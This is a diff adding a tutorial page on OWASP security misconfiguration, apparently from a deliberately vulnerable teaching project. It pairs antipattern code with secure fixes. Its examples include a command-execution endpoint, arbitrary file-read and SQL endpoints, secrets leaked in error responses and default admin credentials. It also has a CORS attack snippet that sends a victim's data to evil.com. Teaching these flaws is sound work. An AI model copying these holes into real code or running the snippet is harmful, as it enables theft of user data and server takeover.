@@ -1,0 +1,313 @@
+---
+title: Security Misconfiguration
+description: "OWASP A05: Default configs, verbose errors, and unnecessary features"
+---
+
+## What is Security Misconfiguration?
+
+**Security Misconfiguration** occurs when:
+- Debug mode is enabled in production
+- Default credentials are unchanged
+- Unnecessary features are enabled
+- Error messages reveal sensitive information
+- CORS is overly permissive
+
+<div class="wrong-way">
+
+## Real Examples from the Project
+
+</div>
+
+### 1. Debug Mode Enabled
+
+<div class="file-path">src/security/security.js</div>
+
+```javascript title="src/security/security.js"
+// ANTIPATTERN: Debug flags in production!
+export const DEBUG = true
+export const VERBOSE_ERRORS = true
+export const EXPOSE_STACK_TRACES = true
+```
+
+### 2. CORS Allows Everything
+
+```javascript title="src/features/index.js"
+// ANTIPATTERN: CORS that allows everything!
+app.use('*', cors({
+  origin: '*',                    // Any origin!
+  allowMethods: ['*'],            // Any method!
+  allowHeaders: ['*'],            // Any header!
+  credentials: true,              // With cookies!
+  exposeHeaders: ['*'],           // Expose all!
+  maxAge: 999999999,              // Cache forever!
+}))
+```
+
+### 3. Verbose Error Messages
+
+```javascript title="src/features/index.js"
+// ANTIPATTERN: Error handler exposes everything!
+app.onError((err, c) => {
+  console.error('[ERROR]', err.message)
+  console.error('[STACK]', err.stack)
+  
+  return c.json({
+    error: err.message,
+    stack: err.stack,           // Full stack trace!
+    path: c.req.path,
+    headers: c.req.header(),    // All request headers!
+    secrets: {
+      jwt: JWT_SECRET,          // Secrets in error response!
+      master: MASTER_PASSWORD,
+    },
+  }, 500)
+})
+```
+
+### 4. Default Credentials
+
+```javascript title="src/security/security.js"
+// ANTIPATTERN: Hardcoded default credentials!
+export const DEFAULT_ADMIN = {
+  username: 'admin',
+  password: 'admin123',
+  role: 'admin',
+}
+```
+
+### 5. Unnecessary Endpoints Enabled
+
+<div class="file-path">src/features/index.js</div>
+
+```javascript title="src/features/index.js"
+// ANTIPATTERN: Dangerous endpoints available to everyone!
+
+// Command execution
+app.get('/exec', async (c) => {
+  const cmd = c.req.query('cmd')
+  return c.text(execSync(cmd).toString())
+})
+
+// File reading
+app.get('/read', async (c) => {
+  const path = c.req.query('path')
+  return c.text(fs.readFileSync(path, 'utf8'))
+})
+
+// SQL execution
+app.get('/sql', async (c) => {
+  const query = c.req.query('q')
+  return c.json(db.executeRaw(query))
+})
+```
+
+---
+
+## Why It's Dangerous
+
+### Information Disclosure
+```javascript
+// Error response reveals:
+{
+  "error": "Connection refused to database at 10.0.0.5:5432",
+  "stack": "Error: Connection refused\n    at connect (/app/node_modules/pg/lib/client.js:123)\n    at...",
+  "secrets": {
+    "jwt": "super-secret-jwt-key"
+  }
+}
+// Attacker now knows:
+// - Internal IP addresses
+// - Database technology
+// - File paths
+// - Secret keys!
+```
+
+### CORS Exploitation
+```javascript
+// Attacker's website can now:
+fetch('https://your-api.com/api/user/me', {
+  credentials: 'include' // Sends victim's cookies!
+}).then(r => r.json())
+  .then(data => {
+    // Steal user data
+    fetch('https://evil.com/steal', { 
+      method: 'POST', 
+      body: JSON.stringify(data) 
+    })
+  })
+```
+
+---
+
+<div class="right-way">
+
+## The Right Way
+
+</div>
+
+### 1. Environment-Based Configuration
+
+```javascript title="src/config.js"
+const isProduction = process.env.NODE_ENV === 'production'
+
+export const config = {
+  // Strict defaults, only relax in development
+  debug: !isProduction,
+  verboseErrors: !isProduction,
+  exposeStackTraces: false, // Never in production
+  
+  // Validate required production settings
+  ...(isProduction && {
+    jwtSecret: requireEnv('JWT_SECRET'),
+    databaseUrl: requireEnv('DATABASE_URL'),
+  }),
+}
+
+function requireEnv(key) {
+  const value = process.env[key]
+  if (!value) {
+    throw new Error(`Missing required env var: ${key}`)
+  }
+  return value
+}
+```
+
+### 2. Proper CORS Configuration
+
+```javascript title="src/middleware/cors.js"
+import { cors } from 'hono/cors'
+
+const allowedOrigins = [
+  'https://myapp.com',
+  'https://www.myapp.com',
+]
+
+// Only add localhost in development
+if (process.env.NODE_ENV !== 'production') {
+  allowedOrigins.push('http://localhost:3000')
+}
+
+export const corsMiddleware = cors({
+  origin: (origin) => {
+    if (allowedOrigins.includes(origin)) {
+      return origin
+    }
+    return null // Reject unknown origins
+  },
+  allowMethods: ['GET', 'POST', 'PUT', 'DELETE'],
+  allowHeaders: ['Content-Type', 'Authorization'],
+  credentials: true,
+  maxAge: 86400, // 24 hours
+})
+```
+
+### 3. Secure Error Handling
+
+```javascript title="src/middleware/error-handler.js"
+const isProduction = process.env.NODE_ENV === 'production'
+
+export function errorHandler(err, c) {
+  // Log full error internally
+  console.error({
+    message: err.message,
+    stack: err.stack,
+    path: c.req.path,
+    method: c.req.method,
+    timestamp: new Date().toISOString(),
+  })
+  
+  // Return sanitized error to client
+  if (isProduction) {
+    // Generic message in production
+    return c.json({
+      error: 'An error occurred',
+      requestId: c.get('requestId'), // For support reference
+    }, 500)
+  } else {
+    // More details in development
+    return c.json({
+      error: err.message,
+      stack: err.stack,
+    }, 500)
+  }
+}
+```
+
+### 4. Remove Dangerous Endpoints
+
+```javascript title="src/routes/index.js"
+// Development-only routes
+if (process.env.NODE_ENV !== 'production') {
+  app.get('/debug', debugHandler)
+  app.get('/sql', sqlHandler)
+}
+
+// Or better: don't include them at all in production build
+```
+
+### 5. Security Headers
+
+```javascript title="src/middleware/security-headers.js"
+export function securityHeaders(c, next) {
+  // Prevent clickjacking
+  c.header('X-Frame-Options', 'DENY')
+  
+  // Prevent MIME sniffing
+  c.header('X-Content-Type-Options', 'nosniff')
+  
+  // XSS protection
+  c.header('X-XSS-Protection', '1; mode=block')
+  
+  // Content Security Policy
+  c.header('Content-Security-Policy', "default-src 'self'")
+  
+  // HSTS (HTTPS only)
+  c.header('Strict-Transport-Security', 'max-age=31536000; includeSubDomains')
+  
+  // Referrer policy
+  c.header('Referrer-Policy', 'strict-origin-when-cross-origin')
+  
+  return next()
+}
+```
+
+---
+
+## Security Configuration Checklist
+
+| Setting | Development | Production |
+|---------|-------------|------------|
+| **Debug mode** | ✅ Enabled | ❌ Disabled |
+| **Stack traces** | ✅ Shown | ❌ Hidden |
+| **CORS origin** | `localhost` | Specific domains |
+| **Error details** | ✅ Verbose | ❌ Generic |
+| **Debug endpoints** | ✅ Available | ❌ Removed |
+| **Security headers** | Optional | ✅ Required |
+| **HTTPS** | Optional | ✅ Required |
+
+---
+
+## Detection Tips
+
+### Red Flags
+- `DEBUG = true` without environment check
+- `cors({ origin: '*' })`
+- Stack traces in API responses
+- `/debug`, `/admin`, `/sql` endpoints accessible
+- Missing security headers
+
+### Tools
+```bash
+# Check security headers
+curl -I https://your-api.com
+
+# Scan for misconfigurations
+npx helmet-csp-header-report https://your-api.com
+
+# Test CORS
+curl -H "Origin: http://evil.com" -I https://your-api.com
+```
+
+:::tip[Principle of Least Privilege]
+Enable only what's needed, disable everything else. Production should be locked down by default.
+:::
